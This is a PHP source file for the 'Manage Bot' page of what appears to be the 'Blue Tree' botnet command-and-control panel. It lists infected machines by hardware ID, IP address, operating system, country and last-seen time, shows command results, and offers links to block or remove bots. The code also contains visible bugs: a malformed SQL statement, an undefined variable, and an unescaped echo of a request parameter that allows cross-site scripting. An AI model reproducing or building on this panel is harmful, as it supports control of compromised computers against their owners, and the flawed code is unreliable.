<?php
include_once("config.php");
$id = "";
$task_type = "";
if(!empty($_GET["id"])){
	$id = $_GET["id"];
	$check = "SELECT * FROM `bots` WHERE `id` = :id";
	if($sth = $db->prepare($check)){
		$sth->bindParam(":id", $id);
		$sth->execute();
		if(!($sth->rowCount() > 0)){
			die("error.");
		}
		
	}
	
		
}

else if(!empty($_GET["block"])){
	$block = $_GET["block"];
	$check = "SELECT * FROM `bots` WHERE `id` = :id";
		if($sth = $db->prepare($check)){
		$sth->bindParam(":id", $block);
		$sth->execute();
		if(!($sth->rowCount() > 0)){
			die("error.");
		}
		
	}
	$block_query = "INSERT INTO `blocked (`hwid`, `time_added`) VALUES (:hwid, CURRENT_TIMESTAMP)";
	if($sth = $db->prepare($block_query)){
		$sth->bindParam(":hwid", $block);
		$sth->execute();
		
	}
	$remove_query = "DELETE FROM `bots` WHERE `id` = :id";
	if($sth = $db->prepare($remove_query)){
		$sth->bindParam(":id", $remove);
		$sth->execute();	
	}
	
}

else if(!empty($_GET["remove"])){
	$remove = $_GET["remove"];
	$check = "SELECT * FROM `bots` WHERE `id` = :id";
		if($sth = $db->prepare($check)){
		$sth->bindParam(":id", $remove);
		$sth->execute();
		if(!($sth->rowCount() > 0)){
			die("error.");
		}
		
	}
	$remove_query = "DELETE FROM `bots` WHERE `id` = :id";
	if($sth = $db->prepare($remove_query)){
		$sth->bindParam(":id", $remove);
		$sth->execute();	
	}
}
	
?>

<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="">
    <meta name="author" content="">
    <title>Blue Tree - Manage Bot</title>
	<link rel="stylesheet" href="assets/vendor_components/bootstrap/dist/css/bootstrap.css">
	<link rel="stylesheet" href="css/bootstrap-extend.css">
	<link rel="stylesheet" href="css/master_style.css">
	<link rel="stylesheet" href="css/skins/_all-skins.css">
    <link href="assets/vendor_components/jvectormap/lib2/jquery-jvectormap-2.0.2.css" rel="stylesheet" />
	<!--[if lt IE 9]>
	<script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
	<script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
	<![endif]-->

     
  </head>

<body class="hold-transition skin-blue sidebar-mini">
<div class="wrapper">

  <header class="main-header">
    <a href="index.php" class="logo">
      
	  <b class="logo-lg">
		  <span ><p>Blue Tree</p></span>
	  </b>
    </a>
  </header>
  
  <?php

include_once("sidebar.php");
?>

  <div class="content-wrapper">
    <section class="content-header">
      <h1>
        Blue Tree
        <small>Manage Bot #<?php echo $id; ?></small>
      </h1>
    </section>

    <section class="content">
	 


	  
	  <div class="row">
		  
		<div class="col-12">
         
         <div class="box">
            <div class="box-header with-border">
              <h3 class="box-title">Manage Bot</h3>
            </div>
            <div class="box-body">
				<div class="table-responsive">
				  <table id="example5" class="table table-bordered table-striped" style="width:100%">
					<thead>
						<tr>
							<th>HWID</th>
							<th>IP</th>
							<th>Block</th>
							<th>Remove</th>
						</tr>
					</thead>
					<tbody>
					<?php
					$bot_options = "SELECT * FROM `bots` WHERE `id` = :id";
					if($sth = $db->prepare($bot_options)){
						
						$sth->bindParam(":id", $id);
						$sth->execute();
						while($row = $sth->fetch(PDO::FETCH_ASSOC)){
							echo "<tr>";
							
							echo "<td>".$row["HWID"]."</td>";
							echo "<td>".$row["IP"]."</td>";
							echo "<td><a href='manage.php?block=".$row["id"]."' type='submit' class='btn btn-success'>Block & Remove</a></td>";
							echo "<td><a href='manage.php?remove=".$row["id"]."' type='submit' class='btn btn-success'>Remove</a></td>";
							echo "</tr>";
						}
					}
					
					?>
					</tbody>
				</table>
				</div>
            </div>
            <!-- /.box-body -->
          </div>
          <!-- /.box -->      
        </div>  
      </div>
	  
	  <div class="row">
		  
		<div class="col-12">
         
         <div class="box">
            <div class="box-header with-border">
              <h3 class="box-title">Bot Info</h3>
            </div>
            <div class="box-body">
				<div class="table-responsive">
				  <table id="example5" class="table table-bordered table-striped" style="width:100%">
					<thead>
						<tr>
							<th>HWID</th>
							<th>Architecture</th>
							<th>System Type</th>
							<th>IP Address</th>
							<th>Operating System</th>
							<th>Country</th>
							<th>Last Seen</th>
						</tr>
					</thead>
					<tbody>
					<?php
					$tasks = "SELECT * FROM `bots` WHERE `id` = :id";
					if($sth = $db->prepare($tasks)){
						$sth->bindParam(":id", $id);
						$sth->execute();
						while($row = $sth->fetch(PDO::FETCH_ASSOC)){
							echo "<tr><td>".$row["HWID"]."</td><td>".$row["env"]."</td><td>".$row["OS"]."</td><td>".$row["IP"]."</td><td>".$row["sys"]."</td><td>".$row["country"]."</td><td>".$row["last_seen"]."</td></tr>";
						}
					}
					?>
					
					</tbody>
				</table>
				</div>
            </div>
            <!-- /.box-body -->
          </div>
          <!-- /.box -->      
        </div>  
      </div>
	  
	  
	  <div class="row">
		<div class="col-12">
         <div class="box">
            <div class="box-header with-border">
              <h3 class="box-title">Bot Info</h3>
            </div>
            <div class="box-body">
				<div class="table-responsive">
				  <table id="example5" class="table table-bordered table-striped" style="width:100%">
					<thead>
						<tr>
							<th>Bot ID</th>
							<th>Command Result</th>
							<th>Time Added</th>
						</tr>
					</thead>
					<tbody>
					
					</tbody>
				</table>
				</div>
            </div>
            <!-- /.box-body -->
          </div>
          <!-- /.box -->      
        </div>  
      </div>
	  
    </section>
  </div>
  <footer class="main-footer">
	<center><b><u>Blue Tree</u></b></center>
  </footer>
  <div class="control-sidebar-bg"></div>
  
</div>

	<script src="assets/vendor_components/jquery/dist/jquery.js"></script>
	<script src="assets/vendor_components/jquery-ui/jquery-ui.js"></script>
	<script src="assets/vendor_components/popper/dist/popper.min.js"></script>
	<script src="assets/vendor_components/bootstrap/dist/js/bootstrap.js"></script>	
	<script src="assets/vendor_components/jquery-slimscroll/jquery.slimscroll.js"></script>
	<script src="assets/vendor_components/fastclick/lib/fastclick.js"></script>
	<script src="assets/vendor_components/jquery.peity/jquery.peity.js"></script>
	<script src="assets/vendor_components/raphael/raphael.min.js"></script>
    <script src="assets/vendor_components/jvectormap/lib2/jquery-jvectormap-2.0.2.min.js"></script>
    <script src="assets/vendor_components/jvectormap/lib2/jquery-jvectormap-world-mill-en.js"></script>
    <script src="assets/vendor_components/jvectormap/lib2/jquery-jvectormap-us-aea-en.js"></script>
	<script src="js/template.js"></script>

</body>
</html>
